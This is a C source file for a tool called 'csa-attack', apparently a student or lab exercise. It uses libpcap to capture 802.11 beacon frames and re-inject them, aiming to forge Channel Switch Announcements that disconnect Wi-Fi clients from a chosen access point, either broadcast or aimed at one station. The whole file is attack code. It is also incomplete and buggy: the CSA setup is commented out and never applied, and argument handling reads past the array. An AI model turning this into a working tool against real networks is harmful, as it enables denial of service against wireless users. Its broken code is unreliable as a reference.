#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>

#include "frame.h"

void usage();
void AP_broadcast_frame(struct Packet *packet);
void AP_unicast_frame(struct Packet *packet, char *station_mac);
void initPacket(struct Packet *packet, char *ap_mac);
void macStringToUint8(char *mac_string, uint8_t *ap_mac);
void handleSignal(int signal);
void cleanup(pcap_t *handle);
void packet_view(
    const struct pcap_pkthdr *h,
    const unsigned char *p
);

pcap_t *global_handle;

int main(int argc, char *argv[]) {
    if (argc < 3) {
        usage();
        return -1;
    }
    
    char *interfaceName = argv[1];
    char *ap_mac = argv[2];
    char *station_mac = argv[3];

    struct Packet packet;

    // initPacket(&packet, argv[2]);
    
    if (argc == 3) {
        AP_broadcast_frame(&packet);
        printf("AP_Broadcast Mode\n");
    } else if (argc == 4) {
        AP_unicast_frame(&packet, argv[3]);
        printf("AP_Unicast Mode\n");
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfaceName, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interfaceName, errbuf);
        return -1;
    }

     // Beacon Frame 필터를 설정
    struct bpf_program fp;
    char filter_exp[] = "type mgt subtype beacon"; // Beacon Frame 필터
    if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return -1;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return -1;
    }
    global_handle = handle;
    signal(SIGINT, handleSignal);
    

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 10) {
        struct pcap_pkthdr *header;
        const unsigned char *cap_packet;

        int result = pcap_next_ex(handle, &header, &cap_packet);
        packet_view(header, cap_packet); //제대로 잡긴하네

        if (pcap_sendpacket(handle, cap_packet, header->len) != 0) {
            printf("Frame send failed\n");
            cleanup(handle);
            exit(-1);
        }
        sleep(1);
    }

    cleanup(handle);
    return 0;
}

void usage() {
    printf("Syntax is incorrect.\n");
    printf("syntax : csa-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void initPacket(struct Packet *packet, char *ap_mac) {
    memset(packet, 0, sizeof(struct Packet));
    packet->radiotap.it_len = 0x0018;
    packet->deauth.type = 0xc0;
    macStringToUint8(ap_mac, packet->deauth.source_address);
    macStringToUint8(ap_mac, packet->deauth.bssid);

    // CSA 정보 추가
    uint8_t channel_num[5] = {0x25, 0x03, 0x01, 0x13, 0x03};
    memcpy(packet->channel_switch_announcement, channel_num, sizeof(channel_num));
}

void AP_broadcast_frame(struct Packet *packet) {
    memset(packet->deauth.destination_address, 0xFF, 6);
}

void AP_unicast_frame(struct Packet *packet, char *station_mac) {
    macStringToUint8(station_mac, packet->deauth.destination_address);
}

void macStringToUint8(char *mac_string, uint8_t *ap_mac) {
    sscanf(mac_string, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);
}

void handleSignal(int signal) {
    printf("Entered Ctrl+C, exit program\n");
    cleanup(global_handle);
    exit(0);
}

void cleanup(pcap_t *handle) {
    printf("pcap close!\n");
    pcap_close(handle);
}

void packet_view(
    const struct pcap_pkthdr *h,
    const unsigned char *p
){
    int len;
    len = 0;

    printf("PACKET\n");
    while(len < h->len) {
        printf("%02x ", *(p++));
        if(!(++len % 16))
            printf("\n");
    }
    printf("\n");
    return ;
}